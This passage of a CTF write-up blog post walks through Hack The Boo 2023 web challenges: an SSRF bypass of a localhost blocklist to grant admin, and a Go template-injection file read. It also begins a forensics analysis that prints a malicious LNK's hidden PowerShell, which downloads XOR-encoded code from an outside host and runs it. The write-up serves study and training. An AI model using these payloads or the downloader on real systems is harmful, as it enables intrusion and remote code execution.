+</span></span><span class="line"><span class="cl">        <span class="n">addProduct</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">description</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Product submitted! Our mods will review your request&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid Manual URL!&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@api.route</span><span class="p">(</span><span class="s1">&#39;/addAdmin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@isFromLocalhost</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">addAdmin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid username&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">makeUserAdmin</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;User updated!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid username&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note the addAdmin route, the only security measure is to accept requests from localhost. If we can find SSRF, we can add our account to admin.
+Exploring the webpage:</p>
+<p><img src="/p/hack-the-boo-2023/Images/HauntMart1.png"
+	width="501"
+	height="571"
+	srcset="/p/hack-the-boo-2023/Images/HauntMart1_hu5267742035195367684.png 480w, /p/hack-the-boo-2023/Images/HauntMart1_hu4755606075005177534.png 1024w"
+	loading="lazy"
+	
+		alt="Registering asdf"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="87"
+		data-flex-basis="210px"
+	
+></p>
+<p>Very quickly, I find the product page, where we might sell a product. The description details that moderators will &ldquo;verify the product thoroughly&rdquo;</p>
+<p><img src="/p/hack-the-boo-2023/Images/HauntMart2.png"
+	width="1287"
+	height="630"
+	srcset="/p/hack-the-boo-2023/Images/HauntMart2_hu8168155678181394867.png 480w, /p/hack-the-boo-2023/Images/HauntMart2_hu16356330099950600445.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="490px"
+	
+></p>
+<p>If our moderator blindly clicks everything, we might get away with just sending him a link to add our user as admin. Otherwise, we might consider a cheeky XSS payload that does this upon loading our request.</p>
+<p><img src="/p/hack-the-boo-2023/Images/HauntMart3.png"
+	width="1279"
+	height="705"
+	srcset="/p/hack-the-boo-2023/Images/HauntMart3_hu2795922424103311058.png 480w, /p/hack-the-boo-2023/Images/HauntMart3_hu5011646324592733596.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="435px"
+	
+></p>
+<p>We see an invalid URL error. It is a little difficult to troubleshoot over the webpage, but when we examine the source code again we can see the problem.
+In <code>util.py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">jwt</span><span class="o">,</span> <span class="nn">datetime</span><span class="o">,</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">generate</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">generate</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">blocked_host</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0.0.0&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">isSafeUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">hosts</span> <span class="ow">in</span> <span class="n">blocked_host</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hosts</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">downloadManual</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">safeUrl</span> <span class="o">=</span> <span class="n">isSafeUrl</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">safeUrl</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">local_filename</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/opt/manualFiles/</span><span class="si">{</span><span class="n">local_filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">iter_content</span><span class="p">(</span><span class="n">chunk_size</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are a list of blocked hosts, which are being filtered. Fortunately for us, the url request for <code>localhost</code> is not case sensitive. We can bypass this filter by adding uppercase letters, such as <code>locAlhost</code>, and the request will still be interpreted as the local host address, <code>127.0.0.1</code>.</p>
+<p><img src="/p/hack-the-boo-2023/Images/HauntMart4.png"
+	width="1307"
+	height="711"
+	srcset="/p/hack-the-boo-2023/Images/HauntMart4_hu10181990490979758539.png 480w, /p/hack-the-boo-2023/Images/HauntMart4_hu16826138625648637557.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="441px"
+	
+></p>
+<p>The request successfully goes though, but I wasn&rsquo;t seeing any flag. At this point, I decided to run a local copy with the provided Docker files so I might see requests happening in the CLI:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo ./build-docker.sh
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl"> * Running on http://127.0.0.1:1337
+</span></span><span class="line"><span class="cl"> * Running on http://172.17.0.2:1337
+</span></span><span class="line"><span class="cl">Press CTRL+C to quit
+</span></span><span class="line"><span class="cl"> * Restarting with stat
+</span></span><span class="line"><span class="cl"> * Debugger is active!
+</span></span><span class="line"><span class="cl"> * Debugger PIN: 110-143-363
+</span></span><span class="line"><span class="cl">2023-10-26 17:36:49,496 INFO success: flask entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when I visit a site on the address <code>http://127.0.0.1:1337</code>, this running program will give me backend info on the request. Example, visiting the main page:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:36:51] &#34;GET / HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:36:51] &#34;GET /static/css/bootstrap.min.css HTTP/1.1&#34; 304 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:36:51] &#34;GET /static/css/style.css HTTP/1.1&#34; 304 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:36:51] &#34;GET /static/js/jquery.js HTTP/1.1&#34; 304 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:36:51] &#34;GET /static/js/script.js HTTP/1.1&#34; 304 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:36:51] &#34;GET /static/images/logo.png HTTP/1.1&#34; 304 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When I view the product submission, I can see my injected URL also being visited:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 - - [26/Oct/2023 17:46:53] &#34;GET /addAdmin?username=asdf HTTP/1.1&#34; 404 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:46:53] &#34;POST /api/product HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The 2nd POST request is referring to my submission on the product page while the 1st GET request is where i directed the Manual URL. Note that the request response is a <code>404</code> error, equivalent to a page not found or not existing.
+Something I had overlooked was the route behavior differences between <code>web</code> and <code>api</code>. The above route source code details some routes as <code>@api.route</code> and others as <code>@web.route</code>. All page visits we have been seeing are web.route, meanwhile things such as the login post and product post are for api.route. A careful look at the POST request for product shows the address as <code>/api/product</code>. All this to say, I was submitting the address wrong after all. We should be looking to send it to <code>/api/addAdmin</code> instead!</p>
+<p><img src="/p/hack-the-boo-2023/Images/HauntMart5.png"
+	width="1287"
+	height="710"
+	srcset="/p/hack-the-boo-2023/Images/HauntMart5_hu4804351202465626044.png 480w, /p/hack-the-boo-2023/Images/HauntMart5_hu10026804756755812466.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="435px"
+	
+></p>
+<p>The request shows green submission, and looking at the request log, we can see a response code 200 this time:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 - - [26/Oct/2023 17:57:06] &#34;GET /api/addAdmin?username=asdf HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">172.17.0.1 - - [26/Oct/2023 17:57:06] &#34;POST /api/product HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At this stage for some reason I had to log out and log back in, perhaps a caching issue? Regardless, once I return to the home page I find the flag!</p>
+<p><img src="/p/hack-the-boo-2023/Images/HauntMart6.png"
+	width="684"
+	height="59"
+	srcset="/p/hack-the-boo-2023/Images/HauntMart6_hu14597144644007311080.png 480w, /p/hack-the-boo-2023/Images/HauntMart6_hu5265099321209080358.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1159"
+		data-flex-basis="2782px"
+	
+></p>
+<h3 id="ghostly-templates">Ghostly Templates
+</h3><blockquote>
+<p>In the dark corners of the internet, a mysterious website has been making waves among the cybersecurity community. This site, known for its Halloween-themed templates, has sparked rumors of an eerie secret lurking beneath the surface. Will you delve into this dark and spooky webapp to uncover the hidden truth?</p>
+</blockquote>
+<hr>
+<p>Ghostly Templates is a web server utilizing Go.
+There is only one main page, and it mentions potential template functions we might try, and a submission form to supply our template link:</p>
+<p><img src="/p/hack-the-boo-2023/Images/GhostlyTemplates1.png"
+	width="1322"
+	height="815"
+	srcset="/p/hack-the-boo-2023/Images/GhostlyTemplates1_hu11263890596119343516.png 480w, /p/hack-the-boo-2023/Images/GhostlyTemplates1_hu7140958327535847970.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="389px"
+	
+></p>
+<p>Distraction: LFI through view.
+Within the <code>view?page=</code>, it feels like directory traversal might be possible. We can even access <code>main.go</code>.</p>
+<p><img src="/p/hack-the-boo-2023/Images/maingo.png"
+	width="577"
+	height="367"
+	srcset="/p/hack-the-boo-2023/Images/maingo_hu7747994484923472683.png 480w, /p/hack-the-boo-2023/Images/maingo_hu3310756129937285567.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<p>However, this is not the way. If we look at the source code, we can see that there is a function checking if we are accessing a file outside of the web root folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">!</span><span class="nx">reqData</span><span class="p">.</span><span class="nf">IsSubdirectory</span><span class="p">(</span><span class="s">&#34;./&#34;</span><span class="p">,</span> <span class="nx">TEMPLATE_DIR</span><span class="o">+</span><span class="s">&#34;/&#34;</span><span class="o">+</span><span class="nx">page</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;Internal Server Error&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This was something I did not find a bypass for, but there is a different solution.
+Also within the source code, we find an interesting function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">p</span> <span class="nx">RequestData</span><span class="p">)</span> <span class="nf">OutFileContents</span><span class="p">(</span><span class="nx">filePath</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can supply an html file that calls <code>OutFileContents</code>, have the service load our template, then execute a read on flag.txt. Because of the docker files, we know the flag exists at the base directory, outside app:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat ../Dockerfile 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">FROM alpine:3.18.3
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl"># Copy flag
+</span></span><span class="line"><span class="cl">COPY flag.txt /flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Making the html file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    {{.OutFileContents &#34;/flag.txt&#34;}}
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running a local test is very simple, as we can use our internal IP address and a python server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo python3 -m http.server 80
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>My internal IP is <code>192.168.0.164</code>, so I can reach this by entering the link as <code>http://192.168.0.164/test.html</code>. When we visit, we get the test flag!</p>
+<p><img src="/p/hack-the-boo-2023/Images/GhostlyTemplates2.png"
+	width="756"
+	height="103"
+	srcset="/p/hack-the-boo-2023/Images/GhostlyTemplates2_hu11991651025625062660.png 480w, /p/hack-the-boo-2023/Images/GhostlyTemplates2_hu14494056006956829005.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="733"
+		data-flex-basis="1761px"
+	
+></p>
+<p>This is all great for testing, but the CTF machine will not be able to reach us if we try supplying the previous IP address. We need to use something such as <code>ngrok</code> that can allow our server to be publicly accessible.</p>
+<p><img src="/p/hack-the-boo-2023/Images/GhostlyTemplates3.png"
+	width="909"
+	height="105"
+	srcset="/p/hack-the-boo-2023/Images/GhostlyTemplates3_hu16528722011524817611.png 480w, /p/hack-the-boo-2023/Images/GhostlyTemplates3_hu16599605592966335733.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="865"
+		data-flex-basis="2077px"
+	
+></p>
+<h2 id="forensics">Forensics
+</h2><h3 id="trick-or-treat">Trick or Treat
+</h3><blockquote>
+<p>Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject &ldquo;Trick or Treat&rdquo; and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn&rsquo;t so scary; maybe the season is not so spooky after all.</p>
+</blockquote>
+<hr>
+<p>We are given a traffic capture file (pcap) and a lnk file, presumably the &ldquo;malicious&rdquo; link that our buddy fell for. First, examining the lnk file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cat</span> <span class="n">trick_or_treat</span><span class="o">.</span><span class="n">lnk</span> 
+</span></span><span class="line"><span class="cl"><span class="n">L</span><span class="err">�</span><span class="n">F</span><span class="err">�@</span><span class="n">FC5P</span><span class="err">�</span><span class="n">O</span><span class="err">�</span> <span class="err">�</span><span class="p">:</span><span class="n">i</span><span class="err">�</span><span class="o">+</span><span class="mi">00</span><span class="err">�</span><span class="o">/</span><span class="n">C</span><span class="p">:</span>\<span class="n">V1Windows</span><span class="err">@</span>     <span class="err">�</span><span class="o">.</span><span class="n">WindowsZ1system32B</span>    <span class="err">�</span><span class="o">.</span><span class="n">system32V2cmd</span><span class="o">.</span><span class="n">exe</span><span class="err">@</span>    <span class="err">�</span><span class="o">.</span><span class="n">cmd</span><span class="o">.</span><span class="n">exeTrick</span> <span class="ow">or</span> <span class="n">treatC</span><span class="p">:</span><span class="err">�</span><span class="o">/</span><span class="n">k</span> <span class="k">for</span> <span class="o">/</span><span class="n">f</span> <span class="s2">&#34;tokens=*&#34;</span> <span class="o">%</span><span class="n">a</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;dir C:\Windows\SysWow64\WindowsPowerShell</span><span class="se">\v</span><span class="s1">1.0\*rshell.exe /s /b /od&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="n">call</span> <span class="o">%</span><span class="n">a</span> <span class="o">-</span><span class="n">windowstyle</span> <span class="n">hidden</span> <span class="s2">&#34;$asvods =&#39;&#39;;$UserAgents = @(&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#39;,&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063&#39;,&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko&#39;);$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add(&#39;User-Agent&#39;, $RandomUserAgent);$boddmei = $WebClient.DownloadString(&#39;http://windowsliveupdater.com&#39;);$vurnwos =&#39;&#39;;for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));C:\Windows\System32\shell32.dll�%SystemRoot%\System32\shell32.dll%SystemRoot%\System32\shell32.dll�%�</span>
+</span></span><span class="line"><span class="cl">                                 <span class="err">�</span><span class="n">wN</span><span class="err">���</span><span class="p">]</span><span class="n">N</span><span class="err">�</span><span class="n">D</span><span class="o">.</span><span class="err">��</span><span class="n">Q</span><span class="err">����</span>     <span class="err">��</span><span class="mi">1</span><span class="n">SPS</span><span class="err">�</span><span class="n">XF</span><span class="err">�</span><span class="n">L8C</span><span class="err">���</span><span class="o">&amp;</span><span class="err">�</span><span class="n">m</span><span class="err">�</span><span class="n">m</span><span class="o">.</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3849600975</span><span class="o">-</span><span class="mi">1564034632</span><span class="o">-</span><span class="mi">632203374</span><span class="o">-</span><span class="mi">1001</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see very clearly that a request is being sent to <code>http://windowsliveupdater.com</code>. We know where communication was being sent, but it looks as though the data is being manipulated as we can see with the <code>xor</code> function, <code>$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};</code>. When we examine the network traffic data with Wireshark, we see only one data object associated with <code>windowsliveupdater.com</code>, which makes the process easier.</p>
+<p><img src="/p/hack-the-boo-2023/Images/TrickOrTreat1.png"
+	width="758"
+	height="555"
+	srcset="/p/hack-the-boo-2023/Images/TrickOrTreat1_hu12440917595823614360.png 480w, /p/hack-the-boo-2023/Images/TrickOrTreat1_hu14294097077531706812.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="327px"
+	
+></p>
+<p>If we follow this stream, we can see a large chunk of data, clearly encoded:</p>
+<p><img src="/p/hack-the-boo-2023/Images/TrickOrTreat2.png"
+	width="1435"
+	height="540"
+	srcset="/p/hack-the-boo-2023/Images/TrickOrTreat2_hu17788422704373579838.png 480w, /p/hack-the-boo-2023/Images/TrickOrTreat2_hu6217685114781400021.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="637px"
+	
+></p>
